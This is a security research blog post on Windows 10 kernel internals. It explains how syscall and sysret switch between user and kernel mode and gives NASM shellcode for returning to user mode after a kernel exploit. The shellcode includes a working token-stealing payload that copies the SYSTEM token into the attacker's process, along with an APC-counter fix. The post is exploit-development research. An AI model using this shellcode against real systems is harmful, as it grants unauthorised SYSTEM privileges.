---
layout: default
title: SYSRET Shellcode
date: 2021-05-08
tags:
  - Windows 10
  - Windows Kernel
  - Shellcode
  - Kernel Shellcode
  - x64 sysret
---

## Introduction
This is supposed to be a somewhat brief post about a neat trick my friend ([@sagitz_](https://twitter.com/sagitz_)) suggested that I try.  
This manly friend had raised a question: instead of messing with [restoring the stack and whatnot]({% post_url 2021-03-11-HEVD_Type_Confusion_Windows_10_RS5_x64 %}), wouldn't it be much easier to just return from kernelmode to usermode in a kernel shellcode?  

This sounds interesting! plus he had one example of someone using it, but in a [linux shellcode](https://github.com/vnik5287/sock_diag_x64/blob/486ce10dbef95776b22f228a74afe39ec9a0e16c/sockdiag_smep.c#L59).
  
<br/>

## Technical background
A disclamer here: this topic is pretty big and I'm not going to cover every little detail all in here. So I highly encourage taking a look in the bottom of this post at the list of great reference articles that I've used.  

My testing was on a Windows 10 version 2004 build 19041.685 as the Guest machine running on Hyper-V.  

The most common way for user mode to interact with kernel code is by **issuing a system call**.   
Moreover, in high probability that's where our abusable kernel vulnerability will be at (in case of LPE) so we will assume our shellcode runs in a context of a system call.  
There are two ways to issue a system call - the `syscall` and the `int 2e` opcodes.  
The choice is based on the _SystemCall_ field in the _SharedUserData_ struct.  
![](/assets/images/sysret_shellcode/ntdll_systemcall_small.jpg)

I'll say that it's safe to assume the `syscall` instruction will be used unless one of the following conditions apply:
* The system is 32bit (`syscall` is long mode instruction)
* Credential Guard feature is enabled - because it's virtualization based and the hypervisor can handle the `int` instruction better  

The main reason there was a move to `syscall` is that it has a much lower overhead than the `int 2e`.  
It might seems like irrelevant dump of information but we must know about these details in order to implement ourself the switching back to usermode from kernelmode.  

Let's assume we're on a host that's using `syscall`. So how does that work?
  
<br/>

## Syscall internals
There are two major execution branches here as well: [with KPTI](https://msrc-blog.microsoft.com/2018/03/23/kva-shadow-mitigating-meltdown-on-windows/) enabled and without.  
Of course it's a simplification but practically that's what we need to address in our implementation.

The `syscall` instuction does many things, including:
* Save rip into rcx
* Save rflags into r11
* Load CS and SS selectors from STAR MSR (0xC0000081)
* Load rip from LSTAR MSR (0xC0000082)

Basically, the LSTAR MSR contains the address of the function in the kernel that handles the system calls.  
When KPTI is enabled (the implementation is called "KVA Shadow" in Windows) this function is different than when it's disabled.
This is clearly visible in this decompilation of `KiInitializeBootStructures` from `ntoskrnl.exe`:
```c
x86SyscallHandler = KiSystemCall32;
x64SyscallHandler = KiSystemCall64;
...
if ( KiKvaShadow )
{
  x86SyscallHandler = KiSystemCall32Shadow;
  x64SyscallHandler = KiSystemCall64Shadow;
}
...
__writemsr(MSR_STAR, 0x23001000000000ui64);
__writemsr(MSR_CSTAR, x86SyscallHandler);
__writemsr(MSR_LSTAR, x64SyscallHandler);
__writemsr(MSR_SYSCALL_MASK, 0x4700ui64);
```

We're interested in how the kernel handles syscalls, so if KPTI is enabled we're interested in the `KiSystemCall64Shadow` function, otherwise it's `KiSystemCall64`.
We'll focus on the non-KPTI implementation here - the `KiSystemCall64` function.  
<br />

### KiSystemCall64
First, the function executes `swapgs` - this lets the kernel use the `gs` register to access important kernel structures.  
When an interrupt occurs there's a need to save a context about the CPU's state before switching to kernelmode.
This context is saved in a struct called [KTRAP_FRAME](https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/2009%2020H2%20(October%202020%20Update)/_KTRAP_FRAME).  
Usually on hardware interrupts it's done partly by the hardware and partly by the exception handling functions in the kernel. But with syscalls, the syscall handler function is responsible of building and saving the `KTRAP_FRAME`.  
After `KiSystemCall64` saves the trap frame (with the help of the `gs` register) it goes on to call the relevant function for the given syscall number.  

Now that we mostly understand what happens when a `syscall` is dispatched from usermode all the way up to kernelmode, we're interested in how the kernel reverts back to usermode.  
Therefore, a point of interest is the function's exit points, like this one:  
![](/assets/images/sysret_shellcode/KiSystemCall64_end_small.jpg)

Specifically it's using `sysret` and that's what we're expecting after we've performed `syscall`.  
We see it's setting the registers _rax, r8, r9, rcx, r11, rbp, rsp_ from some struct and zeroing _edx_ and _xmm_ registers.  
The _rdx, r8, r9, and xmm1-xmm5_ registers are [considered volatile](https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-160) so their value isn't really meaningful and we can ignore them.  
The struct that these registers are copied from is that trap frame we talked about.  

Then, the function executes `swapgs` again so the kernel structs won't be visible to usermode and runs `sysret`.  
_sysret_ does exactly the reverse of _syscall_, which I've detailed here already so I won't dive deeper on that.  
<br/>  

## Implementation
Using all of our knowledge, let's just try it, and adapt one of our kernel shellcodes to use `sysret` and see what happens.  
I'll use the [stack-fixing shellcode](https://github.com/Kristal-g/kristal-g.github.io/blob/master/assets/code/shellcode_fix_stack_pivot.asm) from the [type confusion writeup]({% post_url 2021-03-11-HEVD_Type_Confusion_Windows_10_RS5_x64 %}) as the basis because fixing the stack and restoring `rsp` there feels a bit unstable to me, making it interesting to check if it can be replaced.  
We'll keep the traditional token-stealing part: 
```nasm
start:
	xor rax, rax
	mov rax, [gs:rax + 188h]		; gs[0] == KPCR, Get KPCRB.CurrentThread field
	mov rax, [rax+0xb8]		; Get (KAPC_STATE)ApcState.Process (our EPROCESS)
	mov r9, rax;			; Backup target EPROCESS at r9
	
	; loop processes list
	mov rax, [rax + 0x448]	; +0x448 ActiveProcessLinks : _LIST_ENTRY.Flink; Read first link
	mov rax, [rax]			; Follow the first link
system_process_loop:
	mov rdx, [rax - 0x8]	; ProcessId
	mov r8, rax;			; backup system EPROCESS.ActiveProcessLinks pointer at r8
	mov rax, [rax]			; Next process
	cmp rdx, 4			; System PID
	jnz system_process_loop
	
	mov rdx, [r8 + 0x70]
	and rdx, 0xfffffffffffffff8			; Ignore ref count
	mov rcx, [r9 + 0x4b8]
	and rcx, 0x7
	add rdx, rcx				; put target's ref count into our token
	mov [r9 + 0x4b8], rdx		; rdx = system token; KPROCESS+0x4b8 is the Token, KPROCESS+0x448 is the process links - 0x70 is the diff

; SYSRET SHELLCODE HERE
```

Now let's add what we know:
```nasm
	mov rax, [gs:0x188]		; _KPCR.Prcb.CurrentThread
	mov rdx, [rax + 0x90] 		; ETHREAD.TrapFrame
	mov rcx, [rdx + 0x168]		; ETHREAD.TrapFrame.Rip
	mov r11, [rdx + 0x178]		; ETHREAD.TrapFrame.EFlags
	mov rsp, [rdx + 0x180]		; ETHREAD.TrapFrame.Rsp
	mov rbp, [rdx + 0x158]		; ETHREAD.TrapFrame.Rbp
	xor edx, edx			; Like KiSystemCall64 does
	xor eax, eax 	        	; return STATUS_SUCCESS to NtDeviceIoControlFile 
	swapgs
	o64 sysret		; nasm syntax shit
```

Running this gave a really not surprising result - a Blue Screen:  
![](/assets/images/sysret_shellcode/apc_mismatch_small.jpg)

More specifically, it's a Bug Check 0x1: [APC_INDEX_MISMATCH](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/bug-check-0x1--apc-index-mismatch).  
The documentation's Remarks section suggested it's because a call to `KeEnterCriticalRegion` didn't have a matching call to `KeLeaveCriticalRegion`.  
By looking at the disassembly of `KeLeaveCriticalRegion` ([or the source code](https://github.com/cryptoAlgorithm/nt5src/blob/daad8a087a4e75422ec96b7911f1df4669989611/Source/XPSP1/NT/base/ntos/inc/ke.h#L1740)) it's pretty simple - just add one to `CurrentThread->KernelApcDisable`:  
```nasm
mov rax, [gs:0x188]		; _KPCR.Prcb.CurrentThread
mov cx, [rax + 0x1e4]		; KTHREAD.KernelApcDisable
inc cx
mov [rax + 0x1e4], cx
```

**And that's it! It just works :)**  
A weird quirk about it is that when I'm trying to exit the shell it's stuck for some reason. I don't know why, as I've not spent much time debugging it, because it's possible to terminate the _cmd.exe_ and its _conhost.exe_ externally with no problem.  
<br/>  

## Summary
Currently, this is just a poc/neat trick.  
To use it in a reliable exploit, it should handle way more edge cases. Most importantely - KVAShadow.  
Maybe it will amount to a few lines of code that check for the KVAShadow flag and restore usermode's cr3 if needed, but I don't know.   
If anyone wants to make this shellcode KPTI-friendly it will be awesome.  

Finally, on a bit more personal note - technically figuring it all out and testing took about 6-8 hours. Writing it down for this post took maybe 10 fucking hours. Why??!?   Pretty frustrating.
<br/>  

## Reference list
https://codemachine.com/articles/system_call_instructions.html
https://thecyberil.com/system-call-anatomy/
https://blog.amossys.fr/windows10_TH2_int2E_mystery.html
https://wiki.osdev.org/Sysenter
https://msrc-blog.microsoft.com/2018/03/23/kva-shadow-mitigating-meltdown-on-windows/


## Contact me
Feel free to reach out at my [Twitter](https://twitter.com/gal_kristal) or [email](mailto:gkristal.w@gmail.com)!

